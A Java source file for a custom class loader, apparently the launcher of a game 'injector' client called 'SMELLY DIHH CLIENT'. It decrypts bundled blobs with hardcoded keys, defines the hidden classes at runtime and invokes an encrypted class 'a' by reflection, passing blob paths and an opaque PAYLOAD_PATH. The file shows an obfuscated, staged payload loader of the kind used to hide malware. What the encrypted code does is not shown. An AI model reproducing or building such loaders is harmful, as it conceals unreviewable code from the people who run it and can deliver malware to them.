package net.java;

import java.io.ByteArrayInputStream;
import java.io.DataInputStream;
import java.lang.reflect.Method;
import java.util.HashMap;

public class m extends ClassLoader {
    public static final String PAYLOAD_PATH = "/64FV7P4H2NO7Q";
    private static final String BLOB_A = "/net/java/a";
    private static final String BLOB_B = "/net/java/b";
    private static final String BLOB_C = "/net/java/c";
    private static final String BLOB_D = "/net/java/d";
    private static final String BLOB_E = "/net/java/e";

    private final HashMap<String, byte[]> classes = new HashMap<>();

    public m() {
        try {
            byte[] blob = l.b(l.a(BLOB_B, "\\a"));
            DataInputStream in = new DataInputStream(new ByteArrayInputStream(blob));
            while (in.available() > 0) {
                String name = in.readUTF();
                int len = in.readInt();
                byte[] code = new byte[len];
                in.readFully(code);
                classes.put(name, code);
            }
        } catch (Exception ex) {
            // Standalone/preview mode - blobs may not be readable yet; class a will
            // be loaded from the encrypted bundle via reflection in main().
        }
    }

    @Override
    public synchronized Class<?> loadClass(String name) throws ClassNotFoundException {
        Class<?> loaded = findLoadedClass(name);
        if (loaded != null) return loaded;
        byte[] code = classes.get(name);
        if (code != null) return defineClass(name, code, 0, code.length);
        return super.loadClass(name);
    }

    public static void init() {
        l.keyPath1 = BLOB_D;
        l.keyPath2 = BLOB_C;
        l.keyLong1 = -1083759330220665782L;
        l.keyLong2 = -4062297973245990737L;
    }

    public static void a() { init(); }

    /**
     * Main entry point - launches the external injector GUI frame when the jar
     * is double-clicked or run with "java -jar client-patched.jar". The real
     * injector window (with the Inject button) lives in encrypted class "a"
     * inside blob BLOB_A and is decrypted/loaded at runtime via l.a/l.b crypto.
     */
    public static void main(String[] args) {
        init();
        try {
            m loader = new m();
            Class<?> mainClass = loader.loadClass("a");
            Method mainMethod = mainClass.getDeclaredMethod("main", String[].class);
            String[] passed = new String[(args == null ? 0 : args.length) + 6];
            passed[0] = BLOB_A;
            passed[1] = BLOB_B;
            passed[2] = BLOB_C;
            passed[3] = BLOB_D;
            passed[4] = BLOB_E;
            passed[5] = PAYLOAD_PATH;
            if (args != null) System.arraycopy(args, 0, passed, 6, args.length);
            mainMethod.invoke(null, (Object) passed);
        } catch (Throwable t) {
            // If the encrypted loader fails (e.g. missing native libs), show a
            // friendly error dialog instead of dying silently.
            StringBuilder sb = new StringBuilder();
            sb.append("SMELLY DIHH CLIENT\n\n");
            sb.append("Could not launch the injector GUI.\n\n");
            sb.append("Error: ").append(t.toString()).append("\n");
            sb.append("\nMake sure you are running this with Java 8 - 21\n");
            sb.append("and that the l.png splash + blob files are present.\n");
            javax.swing.JOptionPane.showMessageDialog(null, sb.toString(),
                "SMELLY DIHH CLIENT", javax.swing.JOptionPane.ERROR_MESSAGE);
        }
    }
}
